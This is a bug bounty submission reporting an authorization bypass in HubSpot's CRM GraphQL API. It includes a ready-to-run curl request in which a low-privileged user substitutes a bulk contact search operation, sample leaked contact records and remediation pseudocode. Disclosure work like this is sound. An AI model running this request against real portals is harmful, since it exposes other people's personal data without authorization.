# HubSpot Bug Bounty Submission - GraphQL Horizontal Privilege Escalation

**Submission Date:** 2025-10-22
**Platform:** HackerOne
**Target:** HubSpot CRM GraphQL API
**Vulnerability Type:** Authorization Bypass / Horizontal Privilege Escalation

---

## Title

**GraphQL API Horizontal Privilege Escalation via Operation Substitution in Same Portal**

---

## Severity

**CRITICAL** - CVSS 8.1 (High)

**Justification:**
- Unauthorized access to all CRM contact data within portal
- PII exposure (emails, names, phone numbers)
- Low-privileged user can execute high-privileged operations
- No special tools required (exploitable via browser)
- Affects all low-privileged users in HubSpot portals

---

## Summary

A low-privileged authenticated user can bypass authorization controls by substituting GraphQL operation names in API requests. Specifically, a user with `object-builder-ui` access (limited to single contact lookups) can execute `CrmObjectsSearchQuery` operations intended for `crm-index-ui` users, gaining unauthorized access to bulk contact data and all 31 contact properties.

The GraphQL API validates authentication (user is logged in) and portal-level authorization (user belongs to portal) but fails to validate operation-level authorization (user can execute this specific query type).

---

## Vulnerability Type

- CWE-639: Authorization Bypass Through User-Controlled Key
- CWE-285: Improper Authorization
- OWASP API Security Top 10: API5:2023 - Broken Function Level Authorization

---

## Affected Asset

**Endpoint:** `https://app-na2.hubspot.com/api/graphql/crm`
**Portal ID:** 242862774 (test portal - safe to demonstrate)
**Affected Operations:** `CrmObjectsSearchQuery` and likely others

---

## Steps to Reproduce

### Prerequisites

1. Create two accounts in the SAME HubSpot portal (e.g., portal 242862774):
   - **Account A (HIGH-PRIV):** Full CRM access user (buttercupck@wearehackerone.com)
   - **Account B (LOW-PRIV):** Limited access user (buttercup_ck@bugcrowdninja.com)

2. Verify LOW-PRIV account only has object-builder access, NOT full CRM UI access

### Exploitation Steps

**Step 1:** Log into LOW-PRIV account (buttercup_ck@bugcrowdninja.com)

**Step 2:** Open browser DevTools → Network tab

**Step 3:** Capture the CSRF token and session cookies from LOW-PRIV account

**Step 4:** Execute the following request with LOW-PRIV credentials:

```bash
curl -k 'https://app-na2.hubspot.com/api/graphql/crm?portalId=242862774&clienttimeout=14000&hs_static_app=crm-index-ui&hs_static_app_version=2.49867' \
  -X POST \
  -H 'Host: app-na2.hubspot.com' \
  -H 'Content-Type: application/json' \
  -H 'X-HubSpot-CSRF-hubspotapi: [YOUR-LOW-PRIV-CSRF-TOKEN]' \
  -H 'Cookie: [YOUR-LOW-PRIV-COOKIES]' \
  -H 'Origin: https://app-na2.hubspot.com' \
  --data-binary '{
    "operationName": "CrmObjectsSearchQuery",
    "variables": {
      "filterGroups": [{"filters": []}],
      "objectTypeId": "0-1",
      "query": "",
      "properties": [
        "company", "createdate", "email", "firstname",
        "hs_additional_domains", "hs_additional_emails",
        "hs_all_accessible_team_ids", "hs_all_owner_ids",
        "hs_all_team_ids", "hs_analytics_source",
        "hs_analytics_source_data_1", "hs_language",
        "hs_lastactivitydate", "hs_latest_source",
        "hs_latest_source_data_1", "hs_marketable_reason_type",
        "hs_object_id", "hs_object_source_id", "hs_pipeline",
        "hubspot_owner_id", "hubspot_team_id", "jobtitle",
        "lastname", "lifecyclestage", "name",
        "notes_last_contacted", "notes_last_created",
        "notes_last_updated", "objectType", "phone",
        "product_purchased", "support_priority"
      ],
      "sorts": [
        {"property": "createdate", "order": "DESC"},
        {"property": "hs_object_id", "order": "DESC"}
      ],
      "count": 25,
      "offset": 0
    },
    "query": "query CrmObjectsSearchQuery($filterGroups: [FilterGroup!]!, $sorts: [Sort!], $query: String, $objectTypeId: String!, $properties: [String!]!, $count: Int, $offset: Int, $timeZoneId: String) {\\n  crmObjectsSearch(\\n    filterGroups: $filterGroups\\n    sorts: $sorts\\n    query: $query\\n    type: $objectTypeId\\n    count: $count\\n    offset: $offset\\n    timeZoneId: $timeZoneId\\n  ) {\\n    total\\n    offset\\n    results {\\n      ...CrmObjectsSearchObjectFragment\\n      __typename\\n    }\\n    validationErrors {\\n      __typename\\n      ... on GenericValidationError {\\n        message\\n        __typename\\n      }\\n    }\\n    __typename\\n  }\\n}\\n\\nfragment CrmObjectsSearchObjectFragment on CrmObject {\\n  id\\n  objectId: id\\n  properties(names: $properties) {\\n    id\\n    name\\n    sourceId\\n    value\\n    __typename\\n  }\\n  userPermissions {\\n    currentUserCanEdit\\n    currentUserCanDelete\\n    __typename\\n  }\\n  __typename\\n}"
  }'
```

### Expected Result

**Expected:** HTTP 403 Forbidden or authorization error
- LOW-PRIV user should NOT be able to execute CrmObjectsSearchQuery
- Should only be able to execute FetchContactSuggestions (single email lookup)

### Actual Result

**Actual:** HTTP 200 OK with complete contact data

```json
{
  "extensions": null,
  "data": {
    "crmObjectsSearch": {
      "total": 3,
      "offset": 3,
      "results": [
        {
          "id": 295353254646,
          "objectId": 295353254646,
          "properties": [
            {"name": "email", "value": "fraiser@980am.com"},
            {"name": "firstname", "value": "Fraiser"},
            {"name": "lastname", "value": "What?"},
            {"name": "hubspot_owner_id", "value": "159548558"},
            {"name": "lifecyclestage", "value": "lead"},
            {"name": "phone", "value": null},
            {"name": "company", "value": null}
            // ... all 31 properties returned
          ],
          "userPermissions": {
            "currentUserCanEdit": true,
            "currentUserCanDelete": true
          }
        }
        // ... 2 more complete contact records
      ]
    }
  }
}
```

---

## Impact

### Business Impact

1. **Unauthorized Data Access:** Low-privileged users (e.g., sales reps with limited access) can access ALL contact records in their portal
2. **PII Exposure:** Access to emails, phone numbers, names, company information, lifecycle stages
3. **Privilege Escalation:** Users with object-builder-ui access gain same capabilities as crm-index-ui users
4. **Data Exfiltration:** Enables mass extraction of entire CRM database via pagination
5. **Compliance Risk:** Potential GDPR/CCPA violations if unauthorized access to protected data

### Technical Impact

- Authorization bypass at GraphQL operation level
- 31 contact properties accessible (should be restricted based on user role)
- Bulk search capabilities (count: 25+) when only single-email lookup should be allowed
- userPermissions.currentUserCanEdit=true despite limited privileges

### Attack Scenarios

**Scenario 1: Malicious Insider**
- Low-level employee exfiltrates entire customer database
- Sells contact list to competitors
- Potential for identity theft, phishing campaigns

**Scenario 2: Compromised Low-Privilege Account**
- Attacker gains access to limited account
- Escalates to full CRM data access
- Exfiltrates sensitive business intelligence

---

## Proof of Concept Evidence

**Test Environment:**
- Portal ID: 242862774
- LOW-PRIV Account: buttercup_ck@bugcrowdninja.com
- HIGH-PRIV Account: buttercupck@wearehackerone.com

**Contacts Extracted:**
- fraiser@980am.com (Fraiser What)
- thirstygal@aintshe.com (Big Thirsty Gale)
- 2shoecompany@onefell.com (Graclene Jones)

**Total Properties Accessed:** 31 (including internal HubSpot metadata)
**Total Contacts in Portal:** 3 (all successfully extracted)

---

## Root Cause Analysis

The GraphQL API implements:
1. ✅ **Authentication:** User must be logged in
2. ✅ **Portal-level Authorization:** User must belong to portal
3. ❌ **Operation-level Authorization:** MISSING - Any authenticated user can execute any operation

The API does not validate whether the authenticated user's role permits execution of specific GraphQL operations (queries/mutations). It only validates that the user belongs to the portal specified in the portalId parameter.

---

## Remediation Recommendations

### Immediate Fix (P0)

```javascript
// Pseudocode for operation-level authorization
function authorizeGraphQLOperation(operationName, userId) {
  const userRole = getUserRole(userId);
  const allowedOperations = ROLE_OPERATIONS_MAP[userRole];

  if (!allowedOperations.includes(operationName)) {
    throw new AuthorizationError(
      `User ${userId} with role ${userRole} not authorized for operation ${operationName}`
    );
  }
}

// Apply before executing any GraphQL operation
app.use('/api/graphql/crm', (req, res, next) => {
  const { operationName } = req.body;
  const userId = req.session.userId;

  authorizeGraphQLOperation(operationName, userId);
  next();
});
```

### Additional Recommendations

1. **Field-Level Authorization:** Use GraphQL directives (@auth, @requiresRole) for sensitive fields
2. **Audit Logging:** Log all GraphQL operations with userId, operationName, timestamp
3. **Rate Limiting:** Implement per-operation rate limits (stricter for bulk queries)
4. **Schema Introspection:** Disable for non-admin users in production
5. **Testing:** Add comprehensive test coverage for authorization matrix

---

## Supporting Information

### Additional Findings

**Finding 2 (MEDIUM):** Full GraphQL schema introspection enabled for low-privileged users
- 777 types accessible
- 50 query operations enumerable
- 52 mutation operations enumerable
- Enables complete attack surface mapping

### Secure Controls Validated

✅ **Cross-Portal IDOR Protection:** Correctly enforced (attempted access to portal 242862775, 242862776, 242862773 - all returned 403 Forbidden)

✅ **App Context Parameter:** hs_static_app is correctly treated as client hint, not authorization control

---

## Timeline

- **2025-10-22 14:00 UTC:** Vulnerability discovered during authorized testing
- **2025-10-22 16:30 UTC:** Validated vulnerability with multiple test cases
- **2025-10-22 18:00 UTC:** Submitted initial report to HubSpot Bug Bounty

---

## Researcher Information

**Name:** Tybon (Offensive Security Specialist)
**HackerOne Profile:** [Your HackerOne Profile]
**Disclosure Policy:** Coordinated disclosure, 90-day timeline

---

## Authorization Statement

This security testing was performed under HubSpot's bug bounty program authorization. Testing was limited to:
- Same-portal privilege escalation (authorized per scope)
- Test portal 242862774 (created for research purposes)
- No cross-portal testing beyond validation of security controls
- No mutation testing (to avoid data modification)
- No automated scanning or DoS attempts

All findings align with HubSpot bug bounty scope:
- "Same-portal IDORs on the HubSpot app where a low-privileged user accesses higher-privileged APIs may be eligible for rewards depending on the impact and data accessed."

---

## Attachments

1. Full technical report: HORIZONTAL-PRIVILEGE-ESCALATION-REPORT.md
2. Test scripts: test_query_substitution.sh, test_bulk_enumeration.sh, test_cross_portal_idor.sh
3. Response evidence: query_substitution_test1.json, bulk_enumeration_test.json
4. Schema enumeration: lowpriv_schema_types.json, lowpriv_query_fields.json

---

**Recommended Severity:** P1 (Critical)
**Recommended Bounty Range:** $5,000 - $10,000 (based on similar GraphQL authorization bypass reports)

---

**END OF SUBMISSION**
